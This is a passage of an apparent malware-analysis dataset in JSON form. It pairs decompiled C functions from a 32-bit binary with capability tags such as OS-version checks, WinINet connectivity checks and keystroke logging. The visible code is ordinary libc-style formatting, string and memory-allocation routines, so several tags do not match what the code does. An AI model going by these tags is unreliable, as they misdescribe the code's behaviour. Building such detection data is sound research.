iStack324) {\n                    pVar6 = &Stack280 + uVar10 * 0xc;\n                }\n                for (iVar1 = 0; iVar1 < iStack320; iVar1 = iVar1 + 1) {\n                    (&pStack20)[iVar1] = pVar6;\n                    pVar6 = pVar6 + 0xc;\n                }\n                if (uStack316 != 0) break;\n                fcn.08052808(*pStack20, uStack332 & 0xf00, iStack364, iStack364 >> 0x1f);\n                param_2 = pcStack348;\n                pcVar3 = pcStack348;\n            }\n            if (uStack316 < 8) {\n                iVar1 = *(uStack316 + 0x805429c);\n                uVar8 = 0x57;\n                if ((iVar1 == 10) && (uVar8 = (-((uStack332 & 0x20) == 0) & 0x2bU) + 0x2c,  (uStack332 & 0x40) != 0)) {\n                    uVar8 = uVar8 | 0x80;\n                }\n                if (uStack316 < 6) {\n                    if (uStack316 == 3) {\n                        uVar8 = 0x37;\n                        goto code_r0x0804f450;\n                    }\n                    unaff_EBP = 6;\n                    if (uStack316 != 1) goto code_r0x0804f450;\n                }\n                else {\n                    iVar1 = -iVar1;\ncode_r0x0804f450:\n                    unaff_EBP = 0xb;\n                }\n                cStack357 = ' ';\n                if (ppcStack344 < 0) {\n                    cStack357 = cStack328;\n                }\n                uVar7 = 0x400;\n                if (uStack316 != 1) {\n                    uVar7 = (&uStack312)[uVar10] & 0xf00;\n                }\n                uVar12 = fcn.080527b2(uVar7, pStack20, iVar1, uVar10);\n                pcVar3 = fcn.08052845(&uStack33, uVar12, iVar1, uVar8);\n                if (5 < uStack316) {\n                    if (*pcVar3 == '-') {\n                        uStack332 = uStack332 | 2;\n                        pcVar3 = pcVar3 + 1;\n                        unaff_EBP = 2;\n                    }\n                    else if ((uStack332 & 2) == 0) {\n                        if ((uStack332 & 1) != 0) {\n                            unaff_EBP = 4;\n                        }\n                    }\n                    else {\n                        unaff_EBP = 0;\n                    }\n                }\n                ppcVar9 = &uStack33 + -pcVar3;\n                ppcVar2 = ppcStack344;\n                if (ppcStack344 < 0) {\n                    ppcVar2 = 0x1;\n                }\n                if ((uStack332 & 0x10) != 0) {\n                    if (uStack316 < 3) {\n                        unaff_EBP = 6;\n                    }\n                    if (uStack316 == 3) {\n                        unaff_EBP = 9;\n                    }\n                    else if (((uStack316 == 4) && (ppcVar2 <= ppcVar9)) && (ppcVar2 = 0x1,  *pcVar3 != '0')) {\n                        ppcVar2 = apcStack32 + -pcVar3;\n                    }\n                }\n                if (*pcVar3 == '0') {\n                    if (5 < unaff_EBP) {\n                        unaff_EBP = 0xb;\n                    }\n                    if (uStack316 == 1) {\n                        pcVar3 = \"(nil)\";\n                        ppcVar9 = 0x5;\n                    }\n                    else {\n                        if (ppcVar2 != NULL) goto code_r0x0804f554;\n                        ppcVar9 = NULL;\n                    }\n                }\n                else {\ncode_r0x0804f554:\n                    if (ppcVar9 < ppcVar2) {\n                        iVar1 = ppcVar2 - ppcVar9;\n                        goto code_r0x0804f6df;\n                    }\n                }\n                iVar1 = 0;\n            }\n            else {\n                if (uStack316 < 0x10) {\n                    if ((uStack332 & 0x800) == 0) {\n                        Var11 = SUB109(*pStack20, 0);\n                    }\n                    else {\n                        Var11 = *pStack20;\n                    }\n                    iVar1 = fcn.08052916(param_1, Var11, Var11 >> 0x20, Var11 >> 0x40, &ppcStack344, fcn.0804f243, \n                                         ppcVar9, ppcVar9);\n                    if (iVar1 < 0) {\n                        return 0xffffffff;\n                    }\n                    iStack364 = iStack364 + iVar1;\n                    param_2 = pcStack348;\n                    pcVar3 = pcStack348;\n                    goto code_r0x0804f32d;\n                }\n                if (uStack316 < 0x12) {\n                    apcStack32[0] = NULL;\n                    if (uStack316 == 0x11) {\n                        iStack24 = *pStack20;\n                        if (iStack24 == 0) {\ncode_r0x0804f6c9:\n                            pcVar3 = \"(null)\";\n                            ppcVar9 = 0x6;\n                        }\n                        else {\n                            ppcVar9 = 0xffffffff;\n                            if (-1 < ppcStack344) {\n                                ppcVar9 = ppcStack344;\n                            }\n                            ppcVar9 = fcn.08052502(apcStack32 + 2, apcStack32 + 2, ppcVar9, apcStack32);\n                            if (ppcVar9 == 0xffffffff) {\n                                return 0xffffffff;\n                            }\n                            pcVar3 = NULL;\n                        }\n                    }\n                    else {\n                        pcVar3 = acStack160;\n                        ppcVar9 = fcn.080524be(pcVar3, *pStack20, apcStack32, &pcStack348);\n                        if (ppcVar9 == 0xffffffff) {\n                            return 0xffffffff;\n                        }\n                        acStack160[ppcVar9] = '\\0';\n                    }\n                }\n                else {\n                    if (uStack316 < 0x14) {\n                        if (uStack316 != 0x13) {\n                            pcVar3 = acStack160;\n                            ppcVar9 = 0x1;\n                            acStack160[0] = *pStack20;\n                            acStack160[1] = 0;\n                            goto code_r0x0804f6d3;\n                        }\n                        pcVar3 = *pStack20;\n                        uVar10 = uStack316;\n                        if (pcVar3 == NULL) goto code_r0x0804f6c9;\n                    }\n                    else {\n                        if (uStack316 != 0x14) {\n                            return 0xffffffff;\n                        }\n                        uVar12 = fcn.0804efb0();\n                        pcVar3 = fcn.08050000(*uVar12, acStack160, 0x80, uVar12 >> 0x20);\n                        uVar10 = extraout_ECX;\n                    }\n                    ppcVar9 = 0xffffffff;\n                    if (-1 < ppcStack344) {\n                        ppcVar9 = ppcStack344;\n                    }\n                    ppcVar9 = fcn.0804ff21(pcVar3, ppcVar9, uVar10, uVar10);\n                }\ncode_r0x0804f6d3:\n                iVar1 = 0;\n                unaff_EBP = 0xb;\n                cStack357 = ' ';\n            }\ncode_r0x0804f6df:\n            pcVar4 = ppcVar9 + iVar1;\n            if (unaff_EBP != 0xb) {\n                pcVar4 = pcVar4 + (5 < unaff_EBP) + 1;\n            }\n            pcStack356 = NULL;\n            if (pcVar4 < pcStack340) {\n                pcStack356 = pcStack340 + -pcVar4;\n            }\n            pcVar4 = pcVar4 + pcStack356;\n            iStack364 = iStack364 + pcVar4;\n            if (cStack357 == '0') {\n                iVar1 = iVar1 + pcStack356;\n                pcStack356 = NULL;\n            }\n            if ((uStack332 & 8) == 0) {\n                pcVar4 = fcn.0804f20d();\n                if (pcVar4 != pcStack356) {\n                    return 0xffffffff;\n                }\n                pcStack356 = NULL;\n            }\n            fcn.0804fe04(unaff_EBP + 0x8054291, param_1, pcVar4, pcVar4);\n            iVar5 = fcn.0804f20d();\n            if (iVar5 != iVar1) {\n                return 0xffffffff;\n            }\n            if (iStack24 == 0) {\n                ppcVar2 = NULL;\n                if (ppcVar9 != NULL) {\n                    ppcVar2 = fcn.08052624(pcVar3, ppcVar9, param_1, 0);\n                }\n                if (ppcVar2 != ppcVar9) {\n                    return 0xffffffff;\n                }\n            }\n            else {\n                apcStack32[0] = NULL;\n                for (; ppcVar9 != NULL; ppcVar9 = ppcVar9 - iVar5) {\n                    ppcVar2 = ppcVar9;\n                    if (0x80 < ppcVar9) {\n                        ppcVar2 = 0x80;\n                    }\n                    iVar1 = fcn.08052502(acStack160, apcStack32 + 2, ppcVar2, apcStack32);\n                    iVar5 = 0;\n                    if (iVar1 != 0) {\n                        iVar5 = fcn.08052624(acStack160, iVar1, param_1, unaff_EBP);\n                    }\n                    if (iVar5 != iVar1) {\n                        return 0xffffffff;\n                    }\n                }\n            }\n            pcVar4 = fcn.0804f20d();\n            param_2 = pcStack348;\n            pcVar3 = pcStack348;\n        } while (pcVar4 == pcStack356);\n    }\n    return -1;\n}\n",
        "token_count": 3057
    },
    "0804f906": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0804f906(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    unkbyte10 *pVar4;\n    uint uVar5;\n    unkbyte10 *pVar6;\n    int32_t iVar7;\n    \n    pVar6 = param_1 + 0x50;\n    if (*(param_1 + 0x18) == 0) {\n        if (*(param_1 + 8) == -0x80000000) {\n            puVar1 = *(param_1 + 0x4c);\n            *(param_1 + 0x4c) = puVar1 + 1;\n            uVar5 = *puVar1;\n            *(param_1 + 0x50) = uVar5;\n            *(param_1 + 8) = uVar5;\n        }\n        if (*(param_1 + 4) == -0x80000000) {\n            puVar1 = *(param_1 + 0x4c);\n            *(param_1 + 0x4c) = puVar1 + 1;\n            uVar5 = *puVar1;\n            *(param_1 + 0x50) = uVar5;\n            *(param_1 + 4) = uVar5;\n        }\n        for (iVar7 = 0; iVar7 < *(param_1 + 0x1c); iVar7 = iVar7 + 1) {\n            iVar2 = *(param_1 + 0x28 + iVar7 * 4);\n            if (iVar2 != 8) {\n                puVar1 = *(param_1 + 0x4c);\n                if (iVar2 < 9) {\n                    if (((iVar2 == 2) || (iVar2 < 3)) || (iVar2 != 7)) goto code_r0x0804f9b4;\n                    puVar3 = *(param_1 + 0x4c);\n                    *(param_1 + 0x4c) = puVar3 + 1;\n                    *pVar6 = *puVar3;\n                }\n                else {\n                    if ((iVar2 == 0x400) || (iVar2 < 0x401)) {\ncode_r0x0804f9b4:\n                        *(param_1 + 0x4c) = puVar1 + 1;\n                        uVar5 = *puVar1;\n                    }\n                    else {\n                        if (iVar2 != 0x800) {\n                            if (iVar2 == 0x807) {\n                                pVar4 = *(param_1 + 0x4c);\n                                *(param_1 + 0x4c) = pVar4 + 0xc;\n                                *pVar6 = *pVar4;\n                                goto code_r0x0804f9be;\n                            }\n                            goto code_r0x0804f9b4;\n                        }\n                        *(param_1 + 0x4c) = puVar1 + 2;\n                        uVar5 = *puVar1;\n                        *(pVar6 + 4) = puVar1[1];\n                    }\n                    *pVar6 = uVar5;\n                }\ncode_r0x0804f9be:\n                pVar6 = pVar6 + 0xc;\n            }\n        }\n    }\n    else {\n        if (*(param_1 + 8) == -0x80000000) {\n            *(param_1 + 8) = *(*(param_1 + 0x24) * 0xc + -0xc + pVar6);\n        }\n        if (*(param_1 + 4) == -0x80000000) {\n            *(param_1 + 4) = *(*(param_1 + 0x25) * 0xc + -0xc + pVar6);\n        }\n    }\n    if (*(param_1 + 8) < 0) {\n        *(param_1 + 0x10) = *(param_1 + 0x10) | 8;\n        *(param_1 + 0x10) = *(param_1 + 0x10) & 0xfffffffe;\n        *(param_1 + 8) = -*(param_1 + 8);\n        *(param_1 + 0x14) = 0x20;\n    }\n    return;\n}\n",
        "token_count": 957
    },
    "0804fa3e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.0804fa3e(char **param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    char *pcStack96;\n    int32_t iStack92;\n    char *pcStack88;\n    char acStack72 [32];\n    char *apcStack40 [5];\n    uint32_t uStack20;\n    \n    apcStack40[0] = NULL;\n    apcStack40[1] = NULL;\n    apcStack40[3] = 0x8;\n    apcStack40[4] = 0x8;\n    pcStack88 = param_1[6];\n    uVar11 = param_1[4] & 0x80;\n    if (uVar11 == 0) {\n        pcVar10 = *param_1;\n    }\n    else {\n        uVar4 = 0;\n        do {\n            pcVar10 = *param_1;\n            cVar1 = *(pcVar10 + uVar4 * 4 + -4);\n            acStack72[uVar4] = cVar1;\n            if (cVar1 != *(pcVar10 + uVar4 * 4 + -4)) {\n                return 0xffffffff;\n            }\n        } while ((cVar1 != '\\0') && (uVar4 = uVar4 + 1,  uVar4 < 0x20));\n        acStack72[31] = 0;\n        pcVar10 = acStack72 + 1;\n    }\n    pcStack96 = NULL;\n    iStack92 = 0;\ncode_r0x0804fadd:\n    pcVar6 = pcVar10;\n    pcVar10 = pcVar6;\n    if (*pcVar6 == '*') {\n        pcVar10 = pcVar6 + 1;\n        apcStack40[3 - iStack92] = NULL;\n    }\n    pcVar8 = NULL;\n    while( true ) {\n        cVar1 = *pcVar10;\n        if ((*(*0x805677c + cVar1 * 2) & 8) == 0) break;\n        if (pcVar8 < 0xfff) {\n            pcVar8 = pcVar8 * 10 + -0x30 + cVar1;\n        }\n        pcVar10 = pcVar10 + 1;\n    }\n    if (pcVar6[-1] == '%') {\n        if ((cVar1 == '$') && (0 < pcVar8)) {\n            pcVar10 = pcVar10 + 1;\n            if (pcStack88 == NULL) {\n                return 0xffffffff;\n            }\n            apcStack40[2] = pcVar8;\n            if (pcStack88 < pcVar8) {\n                pcStack88 = pcVar8;\n            }\ncode_r0x0804fb7b:\n            do {\n                pcVar6 = \" +0-#\\'I\";\n                uVar4 = 1;\n                while (cVar1 = *pcVar6,  pcVar6 = pcVar6 + 1,  *pcVar10 != cVar1) {\n                    if (*pcVar6 == '\\0') {\n                        pcVar8 = NULL;\n                        uVar11 = uVar11 & ~((uVar11 & 10) >> 1);\n                        if (pcVar10[-1] != '%') goto code_r0x0804fadd;\n                        goto code_r0x0804fbb1;\n                    }\n                    uVar4 = uVar4 * 2;\n                }\n                uVar11 = uVar11 | uVar4;\n                pcVar10 = pcVar10 + 1;\n            } while( true );\n        }\n        if (pcStack88 < 1) {\n            if ((pcVar10 <= pcVar6) || (*pcVar6 == '0')) {\n                pcStack88 = NULL;\n                pcVar10 = pcVar6;\n                goto code_r0x0804fb7b;\n            }\n            pcStack88 = NULL;\n        }\n        else if (cVar1 != 'm') {\n            return 0xffffffff;\n        }\n    }\ncode_r0x0804fbb1:\n    if (*pcVar6 == '*') {\n        if (pcStack88 == NULL) {\n            if (pcVar6 + 1 != pcVar10) {\n                return 0xffffffff;\n            }\n        }\n        else {\n            if (*pcVar10 != '$') {\n                return 0xffffffff;\n            }\n            if (pcVar8 < 1) {\n                return 0xffffffff;\n            }\n            pcVar10 = pcVar10 + 1;\n            apcStack40[-iStack92] = pcVar8;\n        }\n        pcVar8 = 0x80000000;\n    }\n    if (iStack92 != 0) goto code_r0x0804fc13;\n    pcStack96 = pcVar8;\n    if (*pcVar10 == '.') {\n        iStack92 = -1;\n        pcVar10 = pcVar10 + 1;\n        goto code_r0x0804fadd;\n    }\n    pcVar8 = 0xffffffff;\ncode_r0x0804fc13:\n    pcVar6 = 0x80542a4;\n    do {\n        if (*pcVar10 == *pcVar6) {\n            pcVar10 = pcVar10 + 1;\n            break;\n        }\n        pcVar6 = pcVar6 + 1;\n    } while (*pcVar6 != '\\0');\n    if ((pcVar6 == 0x80542a5 || pcVar6 + -0x80542a4 < 1) && (*pcVar10 == *pcVar6)) {\n        pcVar6 = pcVar6 + 9;\n        pcVar10 = pcVar10 + 1;\n    }\n    uVar4 = pcVar6[9] << 8;\n    if (*pcVar10 == '\\0') {\n        return 0xffffffff;\n    }\n    pcVar6 = \"npxXoudifFeEgGaACScs\";\n    while (*pcVar10 != *pcVar6) {\n        pcVar6 = pcVar6 + 1;\n        if (*pcVar6 == '\\0') goto code_r0x0804fcab;\n    }\n    pcVar7 = pcVar6 + -0x80542e1;\n    if ((0x11 < pcVar7) && ((uVar4 & 0x400) != 0)) {\n        pcVar7 = pcVar6 + -0x80542e3;\n    }\n    param_1[8] = pcVar7;\n    pcVar6 = 0x80542d7;\n    do {\n        pcVar5 = pcVar6;\n        pcVar6 = pcVar5 + 1;\n    } while (pcVar5[1] < pcVar7);\n    pcVar6 = \"npxXoudifFeEgGaACScs\";\n    uStack20 = (*(pcVar5 + -0xf + pcVar5 + -0x80542d7) | uVar4) & *(pcVar5 + -0x1f + pcVar5 + -0x80542d7);\ncode_r0x0804fcab:\n    cVar1 = *pcVar10;\n    param_1[1] = pcVar8;\n    param_1[3] = cVar1;\n    param_1[7] = 0x1;\n    param_1[2] = pcStack96;\n    param_1[5] = (-((uVar11 & 4) == 0) & 0xfffffff0) + 0x30;\n    param_1[4] = uVar11 & 0xfffffffb | uVar4 & 0xf00;\n    if (*pcVar6 == '\\0') {\n        if (*pcVar10 != 'm') {\n            return 0xffffffff;\n        }\n        param_1[8] = 0x14;\n        param_1[7] = NULL;\n    }\n    if (pcStack88 < 1) {\n        *(param_1 + 0x26) = 1;\n        fcn.0804feab(param_1 + 10, &uStack20, param_1[7] << 2, param_1);\n        goto code_r0x0804fdc2;\n    }\n    iVar9 = 0;\n    do {\n        if (iVar9 < 3) {\n            pcVar6 = apcStack40[iVar9];\n            *(iVar9 + 0x24 + param_1) = pcVar6;\n            pcVar6 = pcVar6 & 0xff;\n        }\n        else {\n            pcVar6 = apcStack40[2] + iVar9 + -2;\n        }\n        if ((pcStack88 < pcVar6) && (pcStack88 = pcVar6,  9 < pcVar6)) {\n            return 0xffffffff;\n        }\n        if (apcStack40[iVar9 + 3] != 0x8) {\n            if ((param_1[pcVar6 + -1 + 10] != 0x8) && (param_1[pcVar6 + -1 + 10] != apcStack40[iVar9 + 3])) {\n                iVar2 = fcn.0804fa15();\n                iVar3 = fcn.0804fa15();\n                if (iVar3 < iVar2) goto code_r0x0804fd87;\n            }\n            param_1[pcVar6 + -1 + 10] = apcStack40[iVar9 + 3];\n        }\ncode_r0x0804fd87:\n        iVar9 = iVar9 + 1;\n        if (param_1[7] + 2 <= iVar9) {\ncode_r0x0804fdc2:\n            param_1[6] = pcStack88;\n            if (*(param_1 + 4) < '\\0') {\n                *param_1 = *param_1 + (pcVar10 - &stack0xfffffff0) * 4 + 0xe0;\n            }\n            else {\n                *param_1 = pcVar10 + 1;\n            }\n            return param_1[7] + 2;\n        }\n    } while( true );\n}\n",
        "token_count": 2293
    },
    "0804ff21": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0804ff21(char *param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    \n    param_2 = param_2 + 1;\n    for (pcVar1 = param_1; (param_2 = param_2 + -1,  param_2 != 0 && (*pcVar1 != '\\0')); pcVar1 = pcVar1 + 1) {\n    }\n    return pcVar1 - param_1;\n}\n",
        "token_count": 109
    },
    "0805001d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t fcn.0805001d(uint32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uchar uStack17;\n    \n    if (param_1 < 0x7d) {\n        pcVar6 = \"Success\";\n        for (uVar4 = param_1; uVar4 != 0; uVar4 = uVar4 - (cVar1 == '\\0')) {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        }\n        iVar5 = 0;\n        if (*pcVar6 != '\\0') goto code_r0x0805007b;\n    }\n    iVar5 = 0x16;\n    iVar2 = fcn.08052845(&uStack17, param_1, param_1 >> 0x1f, 0xfffffff6, 0);\n    pcVar6 = iVar2 + -0xe;\n    fcn.0804feab(pcVar6, \"Unknown error \", 0xe);\ncode_r0x0805007b:\n    param_3 = param_3 & -(param_2 != 0);\n    iVar2 = fcn.0804ff0e(pcVar6);\n    uVar4 = iVar2 + 1U;\n    if (param_3 < iVar2 + 1U) {\n        iVar5 = 0x22;\n        uVar4 = param_3;\n    }\n    if (uVar4 != 0) {\n        fcn.0804feab(param_2, pcVar6, uVar4, iVar2);\n        *(param_2 + -1 + uVar4) = 0;\n    }\n    if (iVar5 != 0) {\n        piVar3 = fcn.0804efb0();\n        *piVar3 = iVar5;\n    }\n    return iVar5;\n}\n",
        "token_count": 456
    },
    "08050421": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t * fcn.08050421(uint32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t extraout_ECX;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    ulong uVar19;\n    int32_t iStack64;\n    uint32_t uStack56;\n    uint32_t uStack40;\n    uchar auStack32 [16];\n    \n    fcn.08051b29(auStack32, fcn.08051b26, 0x8056670);\n    fcn.08051b26(0x8056670);\n    uVar9 = *0x8058940;\n    if (0xffffffdf < param_1) {\n        puVar4 = fcn.0804efb0();\n        *puVar4 = 0xc;\n        return NULL;\n    }\n    uStack56 = 0x10;\n    if (0xf < param_1 + 0xb) {\n        uStack56 = param_1 + 0xb & 0xfffffff8;\n    }\n    if ((*0x8058940 & 1) == 0) {\n        if (*0x8058940 == 0) {\n            fcn.0805103e(0x8058940);\n        }\ncode_r0x08050780:\n        uVar9 = *0x805896c;\n        uVar10 = *(*0x805896c + 4) & 0xfffffffc;\n        if (uVar10 < uStack56 + 0x10) {\n            if ((*0x8058940 & 2) != 0) {\n                fcn.0805103e(0x8058940);\n                piVar5 = fcn.08050421(uStack56 - 7);\n                piVar6 = piVar5;\n                goto code_r0x08050b7a;\n            }\n            uVar9 = *0x8058c9c - 1;\n            if ((((*0x8058c8c <= uStack56) && (*0x8058c90 < *0x8058c94)) &&\n                (uVar10 = *0x8058c9c + 10 + uStack56 & ~uVar9,  uStack56 < uVar10)) &&\n               (piVar6 = fcn.08051e58(0, uVar10, 3, 0x22, 0, 0, uVar9, uVar9),  piVar6 != 0xffffffff)) {\n                if ((piVar6 & 7) == 0) {\n                    *piVar6 = 0;\n                    uVar9 = uVar10;\n                }\n                else {\n                    iVar7 = 8 - (piVar6 & 7);\n                    piVar6 = piVar6 + iVar7;\n                    *piVar6 = iVar7;\n                    uVar9 = uVar10 - iVar7;\n                }\n                piVar6[1] = uVar9 | 2;\n                *0x8058c90 = *0x8058c90 + 1;\n                if (*0x8058c98 < *0x8058c90) {\n                    *0x8058c98 = *0x8058c90;\n                }\n                *0x8058ca4 = *0x8058ca4 + uVar10;\n                if (*0x8058cb0 < *0x8058ca4) {\n                    *0x8058cb0 = *0x8058ca4;\n                }\n                piVar5 = *0x8058ca4 + *0x8058ca8;\n                if (*0x8058cb4 < piVar5) {\n                    *0x8058cb4 = piVar5;\n                }\n                goto code_r0x080504ff;\n            }\n            uVar10 = *0x805896c;\n            uVar16 = *(*0x805896c + 4) & 0xfffffffc;\n            iVar7 = uStack56 + 0x10 + *0x8058c88;\n            if ((*0x8058ca0 & 1) != 0) {\n                iVar7 = iVar7 - uVar16;\n            }\n            uVar12 = ~uVar9;\n            uVar17 = uVar12 & iVar7 + uVar9;\n            uVar13 = uVar12;\n            if (uVar17 < 1) {\ncode_r0x08050909:\n                if ((*0x8058ca0 & 1) != 0) {\n                    uVar17 = uVar17 + uVar9 + uVar16 & uVar12;\n                }\n                if (uVar17 < 0x100000) {\n                    uVar17 = 0x100000;\n                }\n                if ((uStack56 < uVar17) &&\n                   (uVar8 = fcn.08051e58(0, uVar17, 3, 0x22, 0, 0, uVar13, uVar13),  uVar8 != 0xffffffff)) {\n                    *0x8058ca0 = *0x8058ca0 & 0xfffffffe;\n                    uVar13 = uVar8 + uVar17;\n                    goto code_r0x0805095f;\n                }\n            }\n            else {\n                uVar8 = fcn.08052384(uVar17);\n                uVar13 = 0xffffffff;\n                if (uVar8 == 0xffffffff) goto code_r0x08050909;\ncode_r0x0805095f:\n                if (uVar8 != 0xffffffff) {\n                    *0x8058ca8 = *0x8058ca8 + uVar17;\n                    uVar11 = uVar10 + uVar16;\n                    if ((uVar8 == uVar11) && (uVar13 == 0xffffffff)) {\n                        *(uVar10 + 4) = uVar17 + uVar16 | 1;\n                    }\n                    else {\n                        if (((*0x8058ca0 & 1) != 0) && ((uVar16 != 0 && (uVar8 < uVar11)))) {\n                            *0x8058ca0 = *0x8058ca0 & 0xfffffffe;\n                        }\n                        uVar18 = uVar8;\n                        if ((*0x8058ca0 & 1) == 0) {\n                            if (uVar13 == 0xffffffff) {\n                                uVar9 = fcn.08052384(0);\n                                *0x8058ca8 = *0x8058ca8 + ((uVar9 - uVar8) - uVar17);\n                                goto code_r0x08050a49;\n                            }\ncode_r0x08050a2d:\n                            iVar7 = 0;\n                            uVar9 = uVar13;\n                        }\n                        else {\n                            if (uVar16 != 0) {\n                                *0x8058ca8 = *0x8058ca8 + (uVar8 - uVar11);\n                            }\n                            if ((uVar8 & 7) == 0) {\n                                iVar7 = 0;\n                            }\n                            else {\n                                iVar7 = 8 - (uVar8 & 7);\n                                uVar18 = uVar8 + iVar7;\n                            }\n                            uVar13 = uVar8 + uVar17;\n                            iVar14 = uVar13 + iVar7 + uVar16;\n                            iVar7 = iVar7 + uVar16 + ((iVar14 + uVar9 & uVar12) - iVar14);\n                            uVar9 = fcn.08052384(iVar7);\n                            if (uVar9 == 0xffffffff) {\n                                uVar9 = fcn.08052384(0);\ncode_r0x08050a49:\n                                iVar7 = 0;\n                            }\n                            else if (uVar9 < uVar8) {\n                                *0x8058ca0 = *0x8058ca0 & 0xfffffffe;\n                                goto code_r0x08050a2d;\n                            }\n                        }\n                        if (uVar9 != 0xffffffff) {\n                            *0x805896c = uVar18;\n                            *(uVar18 + 4) = (uVar9 - uVar18) + iVar7 | 1;\n                            *0x8058ca8 = *0x8058ca8 + iVar7;\n                            if (uVar16 != 0) {\n                                uVar9 = uVar16 - 0xc & 0xfffffff8;\n                                *(uVar10 + 4) = uVar9 | 1;\n                                *(uVar10 + 4 + uVar9) = 5;\n                                *(uVar10 + 8 + uVar9) = 5;\n                                uVar2 = *0x8058c84;\n                                *0x8058c84 = uVar2;\n                                if (0xf < uVar9) {\n                                    *0x8058c84 = 0xffffffff;\n                                    fcn.080511e6(uVar10 + 8);\n                                    *0x8058c84 = uVar2;\n                                }\n                            }\n                        }\n                    }\n                    uVar9 = *0x805896c;\n                    if (*0x8058cac < *0x8058ca8) {\n                        *0x8058cac = *0x8058ca8;\n                    }\n                    if (*0x8058cb4 < *0x8058ca8 + *0x8058ca4) {\n                        *0x8058cb4 = *0x8058ca8 + *0x8058ca4;\n                    }\n                    uVar10 = *(*0x805896c + 4) & 0xfffffffc;\n                    if (uStack56 + 0x10 <= uVar10) {\n                        uVar10 = uVar10 - uStack56;\n                        uVar16 = *0x805896c + uStack56;\n                        puVar1 = *0x805896c + 4;\n                        *0x805896c = uVar16;\n                        *puVar1 = uStack56 | 1;\n                        goto code_r0x08050b0a;\n                    }\n                }\n            }\n            piVar5 = fcn.0804efb0();\n            piVar6 = NULL;\n            *piVar5 = 0xc;\n        }\n        else {\n            uVar16 = *0x805896c + uStack56;\n            puVar1 = *0x805896c + 4;\n            *0x805896c = uVar16;\n            *puVar1 = uStack56 | 1;\n            uVar10 = uVar10 - uStack56;\ncode_r0x08050b0a:\n            piVar5 = uStack56 | 1;\n            *(uVar16 + 4) = uVar10 | 1;\n            piVar6 = uVar9 + 8;\n        }\n        goto code_r0x08050b7a;\n    }\n    if (*0x8058940 < uStack56) {\ncode_r0x080504c6:\n        if (uStack56 < 0x100) {\n            uStack40 = uStack56 >> 3;\n            piVar6 = *(uStack56 + 0x8058978);\n            if (piVar6 != uStack56 + 0x805896c) {\n                piVar5 = piVar6[3];\n                *(uStack56 + 0x8058978) = piVar5;\n                puVar1 = piVar6 + uStack56 + 4;\n                *puVar1 = *puVar1 | 1;\n                piVar5[2] = uStack56 + 0x805896c;\n                goto code_r0x080504ff;\n            }\n        }\n        else {\n            uStack40 = fcn.080503fb();\n            if ((uVar9 & 2) != 0) {\n                fcn.0805103e(0x8058940);\n            }\n        }\n        while (iVar7 = *0x8058980,  *0x8058980 != 0x8058974) {\n            uVar9 = *(*0x8058980 + 4);\n            iVar14 = *(*0x8058980 + 0xc);\n            uVar10 = uVar9 & 0xfffffffc;\n            if ((((uStack56 < 0x100) && (iVar14 == 0x8058974)) && (*0x8058980 == *0x8058970)) &&\n               (uStack56 + 0x10 < uVar10)) {\n                piVar5 = uVar10 - uStack56;\n                iVar14 = *0x8058980 + uStack56;\n                *0x8058970 = iVar14;\n                *(*0x8058980 + 4) = uStack56 | 1;\n                *0x805897c = iVar14;\n                *0x8058980 = iVar14;\n                *(iVar14 + 8) = 0x8058974;\n                *(iVar14 + 0xc) = 0x8058974;\n                *(iVar14 + 4) = piVar5 | 1;\n                *(iVar14 + piVar5) = piVar5;\ncode_r0x08050b5f:\n                piVar6 = iVar7 + 8;\n                goto code_r0x08050b7a;\n            }\n            piVar5 = 0x8058974;\n            *(iVar14 + 8) = 0x8058974;\n            if (uVar10 == uStack56) {\n                puVar1 = *0x8058980 + 4 + uStack56;\n                *0x8058980 = iVar14;\n                *puVar1 = *puVar1 | 1;\n                goto code_r0x08050b5f;\n            }\n            if (uVar10 < 0x100) {\n                uVar16 = uVar9 >> 3;\n                iVar15 = (uVar9 & 0xfffffff8) + 0x805896c;\n                *0x8058980 = iVar14;\n                iVar3 = *((uVar9 & 0xfffffff8) + 